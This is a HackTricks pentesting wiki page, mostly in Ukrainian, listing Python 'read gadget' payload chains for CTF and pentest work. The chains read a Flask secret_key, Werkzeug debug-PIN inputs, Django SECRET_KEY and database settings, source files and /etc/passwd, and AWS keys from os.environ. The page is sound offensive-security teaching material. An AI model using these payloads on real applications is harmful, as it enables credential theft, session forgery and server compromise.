# Python Internal Read Gadgets

{{#include ../../banners/hacktricks-training.md}}

## Основна інформація

Різні вразливості, як-от [**Python Format Strings**](bypass-python-sandboxes/index.html#python-format-string) або [**Class Pollution**](class-pollution-pythons-prototype-pollution.md), можуть дозволити **читати внутрішні дані Python, але не виконувати код**. Тому pentester повинен максимально використати ці дозволи на читання, щоб **отримати чутливі привілеї та ескалувати вразливість**.

### Flask - Читання secret key

Головна сторінка Flask-застосунку, ймовірно, міститиме глобальний об’єкт **`app`**, де **secret налаштовано**.
```python
app = Flask(__name__, template_folder='templates')
app.secret_key = '(:secret:)'
```
У цьому випадку отримати доступ до цього об’єкта можна, використовуючи будь-який gadget для **доступу до глобальних об’єктів** зі сторінки [**Bypass Python sandboxes**](bypass-python-sandboxes/index.html).

Якщо **вразливість знаходиться в іншому файлі Python**, потрібен gadget для обходу файлів, щоб дістатися до головного файлу, **отримати доступ до глобального об’єкта `app.secret_key`** і мати змогу [**підвищити привілеї** знаючи цей ключ](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign).

Payload на кшталт цього [із цього writeup](https://ctftime.org/writeup/36082):<sup>[[3]](#references)</sup>
```python
__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
```
Use this payload to **read `app.secret_key`**. If the original bug also gives you a write primitive (for example, class pollution), the same path can be used to replace it and sign more privileged Flask cookies.

### Werkzeug - machine_id and node uuid

[**Using these payload from this writeup**](https://vozec.fr/writeups/tweedle-dum-dee/) ви зможете отримати доступ до **machine_id** і вузла **uuid**, які є **приватними даними**, потрібними для [**generate the Werkzeug pin**](../../network-services-pentesting/pentesting-web/werkzeug.md) і доступу до Python console у `/console`, якщо **debug mode увімкнено**:<sup>[[4]](#references)</sup>
```python
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug]._machine_id}
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug].uuid._node}
```
> [!WARNING]
> Зверніть увагу, що ви можете отримати **локальний шлях сервера до `app.py`**, згенерувавши деяку **помилку** на вебсторінці, яка **надасть вам шлях**.

Якщо вразливість міститься в іншому python-файлі, перегляньте попередній Flask-трюк для доступу до об'єктів з основного python-файлу.

### Django - SECRET_KEY і модуль settings

Об'єкт налаштувань Django кешується в `sys.modules` після запуску застосунку. Маючи лише примітиви читання, можна отримати **`SECRET_KEY`**, резервні ключі, облікові дані бази даних або солі підписування:
```python
# When DJANGO_SETTINGS_MODULE is set (usual case)
sys.modules[os.environ['DJANGO_SETTINGS_MODULE']].SECRET_KEY

# Through the global settings proxy
a = sys.modules['django.conf'].settings
(a.SECRET_KEY, a.SECRET_KEY_FALLBACKS, a.DATABASES, a.SIGNING_BACKEND,
a.SESSION_ENGINE, a.SESSION_SERIALIZER)
```
Якщо вразливий gadget знаходиться в іншому module, спочатку пройдіться по globals:
```python
__init__.__globals__['sys'].modules['django.conf'].settings.SECRET_KEY
```
`SECRET_KEY_FALLBACKS` так само цінні, як і поточний `SECRET_KEY`: вони й надалі перевіряють старі підписані значення під час ротації.<sup>[[1]](#references)</sup> Також отримуйте витік `SESSION_ENGINE` і `SESSION_SERIALIZER`, щоб швидко визначити, чи вплив обмежується лише підробленням cookie, чи є чимось серйознішим. Докладніше про вплив на web дивіться на сторінці [**Django pentesting page**](../../network-services-pentesting/pentesting-web/django.md).

### Gadgets завантажувача модулів - читання вихідного коду та файлів

Завантажені Python-модулі зазвичай зберігають `__loader__`. Завантажувачі, що працюють із файлами, часто надають `get_source()` і `get_data()`, які є ідеальними **примітивами лише для читання**, коли ви вже можете отримати доступ до об’єкта модуля, але не до `open()`:
```python
m = __init__.__globals__['sys'].modules['__main__']
m.__loader__.get_source(m.__name__)   # source of app.py / __main__
m.__loader__.get_data(m.__file__)     # raw bytes of the same file
```
Це дуже корисно для dump **config modules, blueprints, helper files або hidden routes** і відновлення API keys, DSNs, flag paths або додаткових gadget entry points.

Якщо у вас є лише subclass enumeration, шукайте loader за name замість жорсткого кодування index:
```python
# unbound call: first argument acts as a dummy self
[c for c in object.__subclasses__() if c.__name__ == 'FileLoader'][0].get_data('.', '/etc/passwd')
```
### Глобальні змінні frame генератора / coroutine

Якщо ви можете створити об’єкт generator/coroutine або отримати до нього доступ, його frame може розкрити globals **без використання жодного gadget `__globals__` функції**. Це корисно проти фільтрів, які блокують лише dunder-імена та забувають про атрибути frame, такі як `gi_frame`, `ag_frame`, `cr_frame` або `f_globals`:
```python
(_ for _ in ()).gi_frame.f_globals['__builtins__']
(_ for _ in ()).gi_frame.f_globals['sys'].modules['os'].environ
```
Отримавши globals фрейму, продовжуйте точно так само, як і в інших gadgets (`sys.modules`, об’єкти settings, `os.environ` тощо). Останні sandbox escapes знову й знову виявляють цю проблему, оскільки `gi_frame` і `f_globals` не є dunder-атрибутами й часто переживають наївні deny-lists.

### Змінні середовища / cloud creds через завантажені модулі

Багато jail все ще імпортують `os` або `sys` десь усередині. Ви можете використати будь-яку доступну функцію `__init__.__globals__`, щоб перейти до вже імпортованого модуля `os` і вивести **змінні середовища**, що містять API-токени, cloud keys або flags:
```python
# Classic os._wrap_close subclass index may change per version
cls = [c for c in object.__subclasses__() if 'os._wrap_close' in str(c)][0]
cls.__init__.__globals__['os'].environ['AWS_SECRET_ACCESS_KEY']
```
Якщо індекс підкласу відфільтровано, використовуйте loaders:
```python
__loader__.__init__.__globals__['sys'].modules['os'].environ['FLAG']
```
Змінні середовища часто є єдиними секретами, необхідними для переходу від read до повної компрометації (cloud IAM keys, database URLs, signing keys тощо).

### Django-Unicorn class pollution (CVE-2025-24370)

`django-unicorn` ([**GHSA-g9wf-5777-gq43**](https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43), вразливі версії `<0.61.0`) дозволяв **class pollution** через спеціально сформовані component requests. Property path на кшталт `__init__.__globals__` міг отримати доступ до глобальних змінних component-модуля та імпортованих модулів; в advisory демонструється перезапис Django's `SECRET_KEY` і значень у `os.environ`, а не exploit лише для читання.<sup>[[5]](#references)</sup> Якщо окрема помилка надає доступ для читання до того самого object graph, ці глобальні змінні можуть розкрити configuration і credentials без необхідності code execution.

### Gadget collections для chaining

Нещодавні CTF і дослідження pyjail демонструють надійні read chains, побудовані лише з attribute access та subclass enumeration. Списки, які підтримує спільнота, наприклад [**pyjailbreaker**](https://github.com/jailctf/pyjailbreaker), містять сотні мінімальних gadgets, які можна комбінувати для переходу від objects до `__globals__`, `sys.modules` і зрештою до sensitive data.<sup>[[2]](#references)</sup> Надавайте перевагу пошуку на основі **attribute/name** над використанням raw subclass indexes, оскільки позиція `os._wrap_close`, `FileLoader`, `warnings.catch_warnings` тощо змінюється між версіями Python і за наявності додаткових imported libraries.

## References

- [1] [Документація Django щодо cryptographic signing](https://docs.djangoproject.com/en/6.0/topics/signing/)
- [2] [pyjailbreaker – wiki гаджетів Python sandbox](https://github.com/jailctf/pyjailbreaker)
- [3] [CTFtime.org / idekCTF 2022 / task manager / Writeup](https://ctftime.org/writeup/36082)
- [4] [Tweedle Dum & Dee – writeup FCSC 2023](https://vozec.fr/writeups/tweedle-dum-dee/)
- [5] [Вразливість Django-Unicorn Class Pollution, що призводить до RCE, XSS, DoS і Authentication Bypass (GHSA-g9wf-5777-gq43)](https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43)
{{#include ../../banners/hacktricks-training.md}}
